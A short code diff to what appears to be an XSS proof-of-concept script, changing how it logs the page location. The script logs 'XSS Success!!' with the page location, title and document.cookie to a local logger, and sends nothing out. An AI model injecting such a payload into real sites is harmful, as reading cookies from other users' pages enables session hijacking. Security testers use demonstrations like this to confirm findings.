@@ -7,7 +7,7 @@ setTimeout(function (){
   let logger = window._dfktLog || console.log;
 
   logger('XSS Success!!');
-  logger('This page is being executed from', window.location);
+  logger('This page is being executed from', window.location.toString());
   logger('Document Title', document.title);
   logger('Document Cookie', document.cookie);
 
